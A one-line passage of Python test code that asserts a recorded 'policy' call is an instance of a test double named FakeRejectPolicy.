    assert isinstance(calls["policy"], FakeRejectPolicy)
